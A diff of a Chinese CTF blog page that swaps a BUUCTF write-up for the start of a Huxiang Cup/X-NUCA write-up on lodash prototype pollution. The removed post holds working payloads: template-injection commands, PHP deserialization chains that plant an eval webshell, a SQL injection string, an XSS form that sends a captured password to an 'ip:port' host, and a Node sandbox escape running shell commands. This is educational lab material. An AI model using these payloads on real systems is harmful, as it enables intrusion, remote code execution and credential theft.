@@ -6,19 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>buxqm</title>
+  <title>湖湘杯&amp;xnuca | buxqm</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="title: BUUCTF2date: 2020/10/29categories:   writeup    [SCTF2019]Flag Shoprobots.txt中有源码，发现/work路由中存在rubyREB模板注入但是长度限制为7，这里需要用到[预定义变量]&amp;#40;https://blog.csdn.net/TomorrowAndTuture/article/details/10856">
+  <meta name="description" content="湖湘杯&amp;amp;xnuca复现因为是一起打的，就一起复现吧，都蛮自闭的。 ooooodjs下载源码，提示说由于express-validator中的lodash库版本问题导致存在原型链污染漏洞，看一下package-lock.json发现express-validator中lodash的版本为^4.17.15。  在网上发现该版本的set方法存在原型链污染，审计express-validator的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="buxqm">
-<meta property="og:url" content="http://yoursite.com/2020/10/16/BUUCTF3/index.html">
+<meta property="og:title" content="湖湘杯&amp;xnuca">
+<meta property="og:url" content="http://yoursite.com/2020/11/03/湖湘杯&xnuca复现/index.html">
 <meta property="og:site_name" content="buxqm">
-<meta property="og:description" content="title: BUUCTF2date: 2020/10/29categories:   writeup    [SCTF2019]Flag Shoprobots.txt中有源码，发现/work路由中存在rubyREB模板注入但是长度限制为7，这里需要用到[预定义变量]&amp;#40;https://blog.csdn.net/TomorrowAndTuture/article/details/10856">
+<meta property="og:description" content="湖湘杯&amp;amp;xnuca复现因为是一起打的，就一起复现吧，都蛮自闭的。 ooooodjs下载源码，提示说由于express-validator中的lodash库版本问题导致存在原型链污染漏洞，看一下package-lock.json发现express-validator中lodash的版本为^4.17.15。  在网上发现该版本的set方法存在原型链污染，审计express-validator的">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-11-28T13:57:20.479Z">
+<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5C%E6%B9%96%E6%B9%98%E6%9D%AF&xnuca%E5%A4%8D%E7%8E%B0%5Cimage-20201104161956032.png">
+<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5C%E6%B9%96%E6%B9%98%E6%9D%AF&xnuca%E5%A4%8D%E7%8E%B0%5Cimage-20201104162133609.png">
+<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5C%E6%B9%96%E6%B9%98%E6%9D%AF&xnuca%E5%A4%8D%E7%8E%B0%5Cimage-20201104162556443.png">
+<meta property="og:updated_time" content="2020-11-28T14:14:04.396Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="buxqm">
-<meta name="twitter:description" content="title: BUUCTF2date: 2020/10/29categories:   writeup    [SCTF2019]Flag Shoprobots.txt中有源码，发现/work路由中存在rubyREB模板注入但是长度限制为7，这里需要用到[预定义变量]&amp;#40;https://blog.csdn.net/TomorrowAndTuture/article/details/10856">
+<meta name="twitter:title" content="湖湘杯&amp;xnuca">
+<meta name="twitter:description" content="湖湘杯&amp;amp;xnuca复现因为是一起打的，就一起复现吧，都蛮自闭的。 ooooodjs下载源码，提示说由于express-validator中的lodash库版本问题导致存在原型链污染漏洞，看一下package-lock.json发现express-validator中lodash的版本为^4.17.15。  在网上发现该版本的set方法存在原型链污染，审计express-validator的">
+<meta name="twitter:image" content="g:%5CMyBlog%5Csource%5Cimages%5C%E6%B9%96%E6%B9%98%E6%9D%AF&xnuca%E5%A4%8D%E7%8E%B0%5Cimage-20201104161956032.png">
   
     <link rel="alternative" href="/atom.xml" title="buxqm" type="application/atom+xml">
   
@@ -162,218 +166,37 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-BUUCTF3" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-湖湘杯&amp;xnuca复现" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      湖湘杯&amp;xnuca
+    </h1>
+  
+
+        
+        <a href="/2020/11/03/湖湘杯&xnuca复现/" class="archive-article-date">
+  	<time datetime="2020-11-02T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-03</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>title: BUUCTF2<br>date: 2020/10/29<br>categories: </p>
-<ul>
-<li>writeup  </li>
-</ul>
-<h1 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h1><p>robots.txt中有源码，发现/work路由中存在rubyREB模板注入但是长度限制为7，这里需要用到[预定义变量]&#40;<a href="https://blog.csdn.net/TomorrowAndTuture/article/details/108565910&#41;`$&#39;`,表示的是最后一次模式匹配中匹配部分之后的字符串，也就是说match方法会将字符串分成三部分，匹配部分之前，匹配部分，匹配部分之后，所以当不存在匹配部分是，`$&#39;`就表示该变量。" target="_blank" rel="noopener">https://blog.csdn.net/TomorrowAndTuture/article/details/108565910&#41;`$&#39;`,表示的是最后一次模式匹配中匹配部分之后的字符串，也就是说match方法会将字符串分成三部分，匹配部分之前，匹配部分，匹配部分之后，所以当不存在匹配部分是，`$&#39;`就表示该变量。</a></p>
-<p><code>&lt;%=$&#39;&gt;</code>,需要url编码一次</p>
-<p>payload=<code>/work?secret=&amp;name=&lt;%25%3d%24%18%25&gt;&amp;do=&lt;%25%3d%24%18%25&gt;%20is%20working</code></p>
-<p>得到SECRET,接下来就是JWT伪造了。</p>
-<h1 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h1><p>打开进入/secret路由，输入secret，从报错发现是RC4加密，密钥是HereIsTreasure，将解密后的字符串用模板渲染，存在SSTI。</p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>
+        <h1 id="湖湘杯-amp-xnuca复现"><a href="#湖湘杯-amp-xnuca复现" class="headerlink" title="湖湘杯&amp;xnuca复现"></a>湖湘杯&amp;xnuca复现</h1><p>因为是一起打的，就一起复现吧，都蛮自闭的。</p>
+<h1 id="ooooodjs"><a href="#ooooodjs" class="headerlink" title="ooooodjs"></a>ooooodjs</h1><p>下载源码，提示说由于express-validator中的lodash库版本问题导致存在原型链污染漏洞，看一下package-lock.json发现express-validator中lodash的版本为^4.17.15。</p>
+<p><img src="G:%5CMyBlog%5Csource%5Cimages%5C%E6%B9%96%E6%B9%98%E6%9D%AF&xnuca%E5%A4%8D%E7%8E%B0%5Cimage-20201104161956032.png" alt="image-20201104161956032"></p>
+<p>在网上发现该版本的set方法存在原型链污染，审计express-validator的源码发现在处理post变量时，会调用lodash的set方法</p>
+<p><img src="G:%5CMyBlog%5Csource%5Cimages%5C%E6%B9%96%E6%B9%98%E6%9D%AF&xnuca%E5%A4%8D%E7%8E%B0%5Cimage-20201104162133609.png" alt="image-20201104162133609"></p>
+<p>path的值就是post参数的变量名，但是经过调试发现，如果参数名含有<code>.</code>的话，会将它变成如下格式<code>[&quot;${segment}&quot;]</code></p>
+<p><img src="G:%5CMyBlog%5Csource%5Cimages%5C%E6%B9%96%E6%B9%98%E6%9D%AF&xnuca%E5%A4%8D%E7%8E%B0%5Cimage-20201104162556443.png" alt="image-20201104162556443"></p>
+<p>不过可以通过拼接绕过,提交<code>&quot;.__proto.[aa</code>,经过拼接就得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&quot;.__proto.[aa&quot;]</span><br></pre></td></tr></table></figure>
 
-<h1 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h1><p>打开题目，看见buyflag，可是前不够，题目有cookie，那就看看cookie,发现是一段base64加密过的cookie，解密。</p>
-<p>![image-20201028214648485]&#40;/images/BUUCTF3/image-20201028214648485.png&#41;</p>
-<p>发现money，修改成100，传上去就能买到flag。</p>
-<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>题目说算1000次，没想到真的是1000次，算就完事儿。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">"http://903c7430-9683-4702-a278-3e79fdef8cf2.node3.buuoj.cn/index.php"</span></span><br><span class="line">s=requests.session&amp;<span class="comment">#40;&amp;#41;</span></span><br><span class="line">proxies = &amp;<span class="comment">#123;</span></span><br><span class="line">  <span class="string">"http"</span>: <span class="literal">None</span>,</span><br><span class="line">  <span class="string">"https"</span>: <span class="literal">None</span>,</span><br><span class="line">&amp;<span class="comment">#125;</span></span><br><span class="line">source=s.get&amp;<span class="comment">#40;url,proxies=proxies&amp;#41;</span></span><br><span class="line">source.encdoing=<span class="string">"utf-8"</span></span><br><span class="line">expression=re.search&amp;<span class="comment">#40;r'&amp;#40;\d+ [+-/\*] &amp;#41;+\d+',source.text&amp;#41;.group&amp;#40;&amp;#41;</span></span><br><span class="line">result=eval&amp;<span class="comment">#40;expression&amp;#41;</span></span><br><span class="line">params=&amp;<span class="comment">#123;'answer':result&amp;#125;</span></span><br><span class="line">answer=s.post&amp;<span class="comment">#40;url,data=params,proxies=proxies&amp;#41;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range&amp;<span class="comment">#40;1000&amp;#41;:</span></span><br><span class="line">    expression=re.search&amp;<span class="comment">#40;r'&amp;#40;\d+ [+-/\*] &amp;#41;+\d+',answer.text&amp;#41;.group&amp;#40;&amp;#41;</span></span><br><span class="line">    result=eval&amp;<span class="comment">#40;expression&amp;#41;</span></span><br><span class="line">    params=&amp;<span class="comment">#123;'answer':result&amp;#125;</span></span><br><span class="line">    answer=s.post&amp;<span class="comment">#40;url,data=params,proxies=proxies&amp;#41;</span></span><br><span class="line">    answer.encoding=<span class="string">"utf-8"</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">50</span>==<span class="number">0</span>:</span><br><span class="line">        time.sleep&amp;<span class="comment">#40;1&amp;#41;</span></span><br><span class="line">        <span class="keyword">print</span>&amp;<span class="comment">#40;answer.text&amp;#41;</span></span><br><span class="line"><span class="keyword">print</span>&amp;<span class="comment">#40;answer.text&amp;#41;</span></span><br><span class="line"><span class="keyword">print</span>&amp;<span class="comment">#40;source.text&amp;#41;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p>打开题目，尝试了各种sql注入，发现无法注入，于是发现<a href="http://www.zip中有源码，审计一番，发现熟悉的字符串替换，还有lib.php中的类，那肯定是反序列化字符串逃逸了，在这里说一下链子，首先通过反序列化字符串逃逸控制nickname参数。" target="_blank" rel="noopener">www.zip中有源码，审计一番，发现熟悉的字符串替换，还有lib.php中的类，那肯定是反序列化字符串逃逸了，在这里说一下链子，首先通过反序列化字符串逃逸控制nickname参数。</a></p>
-<p>在updateHelper中有<code>__destruct</code>方法，使用echo输出<code>$this-&gt;sql</code>该值可控，在User类中有<code>__toString</code>方法，nickname可控。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;nickname-&gt;update&amp;<span class="comment">#40;$this-&gt;age&amp;#41;;</span></span><br></pre></td></tr></table></figure>
-
-<p>，而且Info类中有<code>__call</code>方法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login&amp;<span class="comment">#40;$argument[0]&amp;#41;;</span></span><br></pre></td></tr></table></figure>
-
-<p>在<code>__call</code>方法中，CtrlCase与argument都可控，所以可以用<code>__tostring</code>触发<code>__call</code>，让CtrlCase去触发DBctrl中的login方法。</p>
-<p>看看DBCTRL类，发现login方法是传入一个sql语句，使用了预处理，所以无法注入。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result-&gt;bind_result&amp;#40;$idResult, $passwordResult&amp;#41;;</span><br></pre></td></tr></table></figure>
-
-<p>但是由于sql语句可控，所以查询结果的顺序是可控的，也就是说我们可以构造如下语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">password</span>,<span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=?</span><br></pre></td></tr></table></figure>
-
-<p>将password,id调换一下顺序，所以现在$idResult=password，返回得到密码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$age=&apos;loadunionloadloadloadloadloadloadloadloadloadloadunionloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadunionunionloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload&quot;;s:8:&quot;nickname&quot;;O:12:&quot;UpdateHelper&quot;:2:&amp;#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&amp;#123;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&amp;#123;s:3:&quot;age&quot;;i:1;s:8:&quot;nickname&quot;;i:1;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&amp;#123;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;&amp;#125;&amp;#125;&amp;#125;s:3:&quot;any&quot;;s:1:&quot;1&quot;;&amp;#125;&amp;#125;&apos;;</span><br><span class="line">$nickname=&quot;1&quot;;</span><br></pre></td></tr></table></figure>
-
-<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>文件上传确实上传不了，读一下源码吧，发现helper类中有<code>__destruct</code>方法，在upload.php中也有反序列化，估摸着是一道反序列化题，审一下代码逻辑。</p>
-<p>![image-20201029152801352]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201029152801352.png&#41;</p>
-<p>将文件中的信息过滤后读取到数组中，注意<code>$array[&#39;attr&#39;]</code>的值是序列化后的值，之后调用save方法传入数据库中。</p>
-<p>![image-20201029152928750]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201029152928750.png&#41;</p>
-<p>将数组中的键值对取出来，作为列名，值插入到images表中，可见这里insert是没有任何过滤的，所以我们可以使用sql注入任意控制插入的值。</p>
-<p>反序列化的点在show.php中![image-20201029153211638]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201029153211638.png&#41;</p>
-<p>将attr的值取出来，然后反序列化。所以现在思路就清晰了，利用sql注入控制attr的值，进行反序列化，链子非常简单，直接放exp了（PS:由于filename中不能有双引号，而在数据库中，字符串会转换成16进制，所以用16进制编码传值）。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1&apos;,1,1,1,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d&amp;#41;#.jpg&quot;</span><br></pre></td></tr></table></figure>
-
-<p>图片内容随便，控制文件名就好了。</p>
-<h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>使用arjun探测参数发现name参数，尝试&#123;&#123;7*‘7’&#125;&#125;返回7777777得知是jinjia2模板注入，直接读flag。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&amp;#123;&amp;#123;&amp;#40;&amp;#41;.__class__.__bases__[0].__subclasses__&amp;#40;&amp;#41;[80].__init__.__globals__[%27__builtins__%27][%27__imp%27+%27ort__%27]&amp;#40;%27o%27+%27s%27&amp;#41;.popen&amp;#40;&quot;cat%20flag.txt&quot;&amp;#41;.read&amp;#40;&amp;#41;&amp;#125;&amp;#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>打开题目，下载源码，开始审计代码。</p>
-<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>get提交pass=cookie中的值就提示存在flflflflag.php，里面是一个文件包含，使用伪协议读取源码，发现过滤情况如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>&amp;<span class="comment">#40;preg_match&amp;#40;'/data|input|zip/is',$file&amp;#41;&amp;#41;&amp;#123;</span></span><br><span class="line">	<span class="keyword">die</span>&amp;<span class="comment">#40;'nonono'&amp;#41;;</span></span><br><span class="line">&amp;<span class="comment">#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>做到这里思路就断了，查看WriteUp发现了新姿势，在PHP7.0中，文件包含使用string.strip_tags会报Segment Fault错误，如果正在上传文件，则会将文件保存到tmp目录中，不会删除，通过目录扫描可以得到dir.php，读取源码发现列出了tmp目录。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=string.strip_tags/resource=index.php</span><br></pre></td></tr></table></figure>
-
-<p>同时上传文件，然后访问dir.php得到文件路径，包含之后在phpinfo中找到flag。</p>
-<h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>下载源码，开始审计，很直白的反序列化，利用文件写入getshell，这里出现了thinkphp反序列化链中常见的死亡exit，不过filename和content是分开控制，使用php://filter协议中的base64过滤器绕过，json_encode返回的是字符串，可以用serialize函数处理。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&amp;#123;</span></span><br><span class="line">    protected $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>&amp;#40</span>;&amp;<span class="comment">#41; &amp;#123;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire =<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autosave=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache=[<span class="string">'filename'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;complete=<span class="string">'PD9waHAgQGV2YWwoJF9QT1NUWydhYSddKTs/Pg=='</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=<span class="string">"222.php"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store=<span class="keyword">new</span> B&amp;<span class="comment">#40;&amp;#41;;</span></span><br><span class="line">    &amp;<span class="comment">#125;</span></span><br><span class="line">&amp;<span class="comment">#125;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>&amp;#123;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>&amp;#40;&amp;#41; &amp;#123;</span></span><br><span class="line">        $this-&gt;options=["prefix"=&gt;'php://filter/write=convert.base64-decode/resource=',"serialize"=&gt;"serialize"];</span><br><span class="line">    &amp;<span class="comment">#125;</span></span><br><span class="line">&amp;<span class="comment">#125;</span></span><br><span class="line">$a=<span class="keyword">new</span> A&amp;<span class="comment">#40;&amp;#41;;</span></span><br><span class="line"><span class="keyword">echo</span> urlencode&amp;<span class="comment">#40;serialize&amp;#40;$a&amp;#41;&amp;#41;;</span></span><br></pre></td></tr></table></figure>
-
-<p>成功getshell。</p>
-<h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>一道xss，查看login.js，功能是将password记录一下。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if &amp;#40;document.cookie &amp;&amp; document.cookie != ''&amp;#41; &amp;#123;</span><br><span class="line">	var cookies = document.cookie.split&amp;#40;'; '&amp;#41;;</span><br><span class="line">	var cookie = &amp;#123;&amp;#125;;</span><br><span class="line">	for &amp;#40;var i = 0; i &lt; cookies.length; i++&amp;#41; &amp;#123;</span><br><span class="line">		var arr = cookies[i].split&amp;#40;'='&amp;#41;;</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&amp;#125;</span><br><span class="line">	if&amp;#40;typeof&amp;#40;cookie['user']&amp;#41; != "undefined" &amp;&amp; typeof&amp;#40;cookie['psw']&amp;#41; != "undefined"&amp;#41;&amp;#123;</span><br><span class="line">		document.getElementsByName&amp;#40;"username"&amp;#41;[0].value = cookie['user'];</span><br><span class="line">		document.getElementsByName&amp;#40;"password"&amp;#41;[0].value = cookie['psw'];</span><br><span class="line">	&amp;#125;</span><br><span class="line">&amp;#125;</span><br></pre></td></tr></table></figure>
-
-<p>登录有有一个feedback，页面源代码中有注释，将许多关键字替换为空，这个可以拼接绕过，最主要的坑是没有提示bot会填表单。</p>
-<p>所以我们可以构造一个表单给bot填写，然后跳转到我们的服务器即可，密码就是flag。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">"./js/login.js"</span>&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">    var psw = docucookiement.getcookieElementsByName&amp;#40;"password"&amp;#41;[0].value;</span><br><span class="line">    docucookiement.locacookietion=<span class="string">"http://ip:port/?a="</span>+psw;</span><br><span class="line">&lt;<span class="regexp">/scrcookieipt&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>下载源码，是一道伪随机数爆破，告诉了我们前16位为KVQP0LdJKRaV3n9D，使用php_mt_seed工具爆破随机数种子为:1775196155。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=&apos;or 1=1#&amp;Private_key=XuNhoueCDCGc&amp;login=1</span><br></pre></td></tr></table></figure>
-
-<h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p>审计代码</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5&amp;#40;first+keys[0]&amp;#41; === md5&amp;#40;second+keys[0]&amp;#41;</span><br></pre></td></tr></table></figure>
-
-<p>在js中，使用<code>+</code>运算符时会将不是字符串类型的数据转换成字符串类型。如果是数组的话，会首先调用数组类型valueof方法再执行toString方法，将数组转换为字符串类型，值为数组中的值，因为要传递对象，所以用json传值。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;&quot;e&quot;:&quot;1&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[1]&amp;#125;</span><br></pre></td></tr></table></figure>
-
-<p>接下来就是绕过正则，看一下正则表达式，匹配的是<code>math.******</code>这样的字符串或者字串，<code>***</code>中只能含有数字和一些字符。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#40;?:Math&amp;#40;?:\.\w+&amp;#41;?&amp;#41;|[&amp;#40;&amp;#41;+\-*/&amp;|^%&lt;&gt;=,?:]|&amp;#40;?:\d+\.?\d*&amp;#40;?:e\d+&amp;#41;?&amp;#41;</span><br></pre></td></tr></table></figure>
-
-<p>可以用的字符串只有一个Math，恰好，js中可以定义匿名函数，格式是<code>参数名=&gt;&amp;#40;函数实体&amp;#41;</code>刚好满足正则表达式，想要执行任意命令，首先要获取process对象，但是想要正则表达式，只能靠字符串对象的StringCharCode方法，所以首先要得到一个字符串对象，首先Math是一个对象，之前说过<code>+</code>再字符串拼接时会将对象类型强制转换为字符串类型，所以可以传入参数Math+1这种方法来获得字符串对象，由于过滤了;号，使用逗号作为语句分隔。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#40;Math=&gt;</span><br><span class="line">&amp;#40;Math=Math.constructor;Math.x=Math.constructor&amp;#40;Math.fromCharCode&amp;#40;114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41&amp;#41;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#41;&amp;#40;Math+1&amp;#41;</span><br></pre></td></tr></table></figure>
-
-<p>StringCharCode解析完之后是：</p>
